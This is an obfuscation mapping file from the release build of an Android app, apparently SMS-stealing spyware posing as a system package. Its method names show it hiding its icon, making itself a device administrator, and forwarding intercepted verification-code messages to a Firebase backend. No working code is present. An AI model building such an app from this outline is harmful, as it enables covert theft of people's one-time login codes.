app/build/outputs/mapping/release/mapping.txt
com.android.os.MainActivity -> com.android.os.MainActivity:
    android.app.admin.DevicePolicyManager mDPM -> m
    android.content.ComponentName mAdminName -> n
    void <init>() -> <init>
    void onCreate(android.os.Bundle) -> onCreate
    void onActivityResult(int,int,android.content.Intent) -> onActivityResult
    void onRequestPermissionsResult(int,java.lang.String[],int[]) -> onRequestPermissionsResult
    void hideApp(android.view.View) -> hideApp
    void SHOW_LOG(java.lang.String) -> a
    boolean isHavePermissionForReceivingSMS() -> k
    void requestPermissionForReceivingSMS() -> l
    void makeAppAsDeviceAdministrator() -> m
com.android.os.MainActivity$DeviceAdmin -> com.android.os.MainActivity$DeviceAdmin:
    void <init>() -> <init>
    void onEnabled(android.content.Context,android.content.Intent) -> onEnabled
    java.lang.CharSequence onDisableRequested(android.content.Context,android.content.Intent) -> onDisableRequested
    void onDisabled(android.content.Context,android.content.Intent) -> onDisabled
    void SHOW_LOG(java.lang.String) -> a
com.android.os.Message -> com.android.os.a:
    java.lang.String senderNumber -> a
    java.lang.String messageBody -> b
    void <init>() -> <init>
    void setSenderNumber(java.lang.String) -> a
    java.lang.String getMessageBody() -> a
    void setMessageBody(java.lang.String) -> b
com.android.os.SmsReceiver -> com.android.os.SmsReceiver:
    android.content.Context context -> a
    void <init>() -> <init>
    void onReceive(android.content.Context,android.content.Intent) -> onReceive
    void SHOW_LOG(java.lang.String) -> b
    void sendIntoCloud(android.content.Context,com.android.os.Message) -> a
    com.android.os.Message getReceivedMessage(android.content.Intent) -> a
    boolean isVerificationCodeMessage(com.android.os.Message) -> a
    boolean isMessageContainNumber(java.lang.String) -> a
    int checkCorrectAnswersPercentage(int,int) -> a
    void access$000(com.android.os.SmsReceiver,java.lang.String) -> a
com.android.os.SmsReceiver$1 -> com.android.os.SmsReceiver$1:
    com.android.os.SmsReceiver this$0 -> a
    void <init>(com.android.os.SmsReceiver) -> <init>
    void onComplete(com.google.firebase.database.DatabaseError,com.google.firebase.database.DatabaseReference) -> a
...
android.support.v4.view.LayoutInflaterCompat$LayoutInflaterCompatApi21Impl -> android.support.v4.g.e$a:
    void <init>() -> <init>
    void setFactory2(android.view.LayoutInflater,android.view.LayoutInflater$Factory2) -> a
android.support.v4.view.LayoutInflaterCompat$LayoutInflaterCompatBaseImpl -> android.support.v4.g.e$b:
    void <init>() -> <init>
    void setFactory2(android.view.LayoutInflater,android.view.LayoutInflater$Factory2) -> a
android.support.v4.view.MarginLayoutParamsCompat -> android.support.v4.g.f:
    int getMarginStart(android.view.ViewGroup$MarginLayoutParams) -> a
    int getMarginEnd(android.view.ViewGroup$MarginLayoutParams) -> b
android.support.v4.view.MenuItemCompat -> android.support.v4.g.g:
    android.support.v4.view.MenuItemCompat$MenuVersionImpl IMPL -> a
    android.view.MenuItem setActionProvider(android.view.MenuItem,android.support.v4.view.ActionProvider) -> a
    void setContentDescription(android.view.MenuItem,java.lang.CharSequence) -> a
    void setTooltipText(android.view.MenuItem,java.lang.CharSequence) -> b
    void setNumericShortcut(android.view.MenuItem,char,int) -> a
    void setAlphabeticShortcut(android.view.MenuItem,char,int) -> b
    void setIconTintList(android.view.MenuItem,android.content.res.ColorStateList) -> a
    void setIconTintMode(android.view.MenuItem,android.graphics.PorterDuff$Mode) -> a
    void <clinit>() -> <clinit>
android.support.v4.view.MenuItemCompat$MenuItemCompatApi26Impl -> android.support.v4.g.g$a:
    void <init>() -> <init>
    void setContentDescription(android.view.MenuItem,java.lang.CharSequence) -> a
    void setTooltipText(android.view.MenuItem,java.lang.CharSequence) -> b
    void setAlphabeticShortcut(android.view.MenuItem,char,int) -> a
    void setNumericShortcut(android.view.MenuItem,char,int) -> b
    void setIconTintList(android.view.MenuItem,android.content.res.ColorStateList) -> a
    void setIconTintMode(android.view.MenuItem,android.graphics.PorterDuff$Mode) -> a
android.support.v4.view.MenuItemCompat$MenuItemCompatBaseImpl -> android.support.v4.g.g$b:
    void <init>() -> <init>
    void setContentDescription(android.view.MenuItem,java.lang.CharSequence) -> a
    void setTooltipText(android.view.MenuItem,java.lang.CharSequence) -> b
    void setAlphabeticShortcut(android.view.MenuItem,char,int) -> a
    void setNumericShortcut(android.view.MenuItem,char,int) -> b
    void setIconTintList(android.view.MenuItem,android.content.res.ColorStateList) -> a
    void setIconTintMode(android.view.MenuItem,android.graphics.PorterDuff$Mode) -> a
android.support.v4.view.MenuItemCompat$MenuVersionImpl -> android.support.v4.g.g$c:
    void setContentDescription(android.view.MenuItem,java.lang.CharSequence) -> a
    void setTooltipText(android.view.MenuItem,java.lang.CharSequence) -> b
    void setAlphabeticShortcut(android.view.MenuItem,char,int) -> a
    void setNumericShortcut(android.view.MenuItem,char,int) -> b
    void setIconTintList(android.view.MenuItem,android.content.res.ColorStateList) -> a
    void setIconTintMode(android.view.MenuItem,android.graphics.PorterDuff$Mode) -> a
android.support.v4.view.NestedScrollingChild -> android.support.v4.g.h:
    void stopNestedScroll() -> stopNestedScroll
android.support.v4.view.NestedScrollingChild2 -> android.support.v4.g.i: